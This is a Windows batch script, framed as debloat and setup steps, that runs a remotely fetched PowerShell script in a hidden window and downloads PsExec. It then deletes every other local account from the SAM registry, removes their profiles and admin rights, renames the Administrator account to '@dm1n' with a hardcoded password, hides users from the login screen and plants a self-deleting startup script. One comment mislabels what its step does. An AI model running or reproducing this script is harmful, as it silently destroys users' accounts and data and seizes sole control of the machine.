@echo off

:: -----------------------------------------------------------------
:: 1. Run the debloat script (hidden)
:: -----------------------------------------------------------------
powershell -WindowStyle Hidden -c "$c = '%TEMP%\c.json'; Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/shansnow89/apps/refs/heads/main/config.json' -OutFile $c -UseBasicParsing; & ([scriptblock]::Create((irm 'https://debloat.raphi.re/'))) -Config $c -Silent"

:: -----------------------------------------------------------------
:: 2. Create user.bat in the Startup folder (post‑reboot tasks)
:: -----------------------------------------------------------------
(
echo @echo off
echo reg delete "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion" /v RegisteredOwner /f
echo reg delete "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion" /v RegisteredOrganization /f
echo net user @dm1n "IBEX@dm1n!" ^>nul 2^>^&1
echo powershell -c "Start-Process cmd -Verb RunAs -ArgumentList '/c for /f \"skip=4 tokens=1-3 delims= \" %%a in (''net localgroup Administrators'') do @if /i not \"%%a\"==\"Administrator\" if /i not \"%%a\"==\"@dm1n\" if /i not \"%%a\"==\"%%COMPUTERNAME%%\\@dm1n\" net localgroup Administrators %%a /delete >nul 2>&1'"
echo psexec -accepteula -s -i powershell -Command "$exclude=@('Public','Default','@dm1n'); Get-ChildItem 'C:\Users' -Directory | Where-Object {$exclude -notcontains $_.Name} | ForEach-Object {$p=$_.FullName; (Get-WmiObject Win32_UserProfile | Where-Object {$_.LocalPath -eq $p}) | ForEach-Object {$_.Delete()}; Remove-Item $p -Recurse -Force -ErrorAction SilentlyContinue}; attrib +h 'C:\Users\Public' 2>$null; tzutil /s 'Singapore Standard Time'; shutdown -r -t 5; Start-Sleep -Seconds 3; Remove-Item -Path $MyInvocation.MyCommand.Path -Force -ErrorAction SilentlyContinue"
echo del "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\user.bat" /f /q ^>nul 2^>^&1
echo shutdown -r -t 20 ^>nul 2^>^&1
) > "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\user.bat"

:: -----------------------------------------------------------------
:: 3. Download PsExec (Sysinternals)
:: -----------------------------------------------------------------
powershell -nop -c "$ProgressPreference='SilentlyContinue'; [Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12; $wc=New-Object Net.WebClient; $wc.DownloadFile('https://live.sysinternals.com/PsExec.exe','C:\Windows\System32\PsExec.exe')" >nul 2>&1

:: -----------------------------------------------------------------
:: 4. Delete SAM entries for all users except Administrator and @dm1n
:: -----------------------------------------------------------------
psexec -accepteula -s -i powershell -Command "Get-ChildItem 'HKLM:\SAM\SAM\Domains\Account\Users\Names' | Where-Object {$_.PSChildName -ne 'Administrator' -and $_.PSChildName -ne '@dm1n'} | Remove-Item -Force -Recurse" >nul 2>&1

:: -----------------------------------------------------------------
:: 5. Enable Administrator, set password, rename to @dm1n (immediate)
:: -----------------------------------------------------------------
net user Administrator /active:yes >nul 2>&1
powershell -Command "Rename-LocalUser -Name 'Administrator' -NewName '@dm1n' -Confirm:$false" >nul 2>&1

:: -----------------------------------------------------------------
:: 6. Hide all local users except @dm1n from the login screen
:: -----------------------------------------------------------------
reg delete "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /va /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /v "@dm1n" /t REG_DWORD /d 1 /f >nul 2>&1
for /f "skip=4 tokens=1" %%u in ('net user 2^>nul') do @if /i not "%%u"=="@dm1n" reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /v "%%u" /t REG_DWORD /d 0 /f >nul 2>&1

:: -----------------------------------------------------------------
:: 7. Prevent enumeration of local users
:: -----------------------------------------------------------------
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\OOBE /v BypassNRO /t REG_DWORD /d 1 /f >nul 2>&1

:: -----------------------------------------------------------------
:: 8. Set timezone and reboot – user.bat will handle remaining cleanup after reboot
:: -----------------------------------------------------------------
tzutil /s "Singapore Standard Time" >nul 2>&1
shutdown -r -t 0 >nul 2>&1
